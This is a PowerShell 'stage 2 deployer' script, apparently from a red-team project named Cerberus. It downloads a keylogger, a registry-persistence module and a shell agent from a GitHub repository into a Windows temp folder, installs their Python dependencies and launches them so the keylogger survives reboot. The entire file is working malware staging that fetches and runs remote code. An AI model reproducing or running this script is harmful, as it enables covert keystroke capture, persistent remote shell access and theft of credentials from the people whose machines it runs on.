# Project Cerberus - Stage 2 Deployer

$dir = "C:\Windows\Temp\cerberus"
$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger"

New-Item -ItemType Directory -Force -Path $dir | Out-Null

# Download all files
Invoke-WebRequest -Uri "$base/config.py"       -OutFile "$dir\config.py"
Invoke-WebRequest -Uri "$base/keylogger.py"    -OutFile "$dir\keylogger.py"
Invoke-WebRequest -Uri "$base/persistence.py"  -OutFile "$dir\persistence.py"
Invoke-WebRequest -Uri "$base/shell_agent.py"  -OutFile "$dir\shell_agent.py"
Invoke-WebRequest -Uri "$base/requirements.txt" -OutFile "$dir\requirements.txt"

# Install all Python dependencies
pip install -r "$dir\requirements.txt" -q

# Run persistence.py — writes registry key so keylogger survives reboot
python "$dir\persistence.py"

# Launch shell_agent.py
Start-Process python -ArgumentList "$dir\shell_agent.py" -WorkingDirectory $dir -WindowStyle Normal

# Launch keylogger.py
Start-Process python -ArgumentList "$dir\keylogger.py" -WorkingDirectory $dir -WindowStyle Normal

# Keep window open so we can read any errors
Write-Host "`n[+] Deploy complete. Press any key to close..."
pause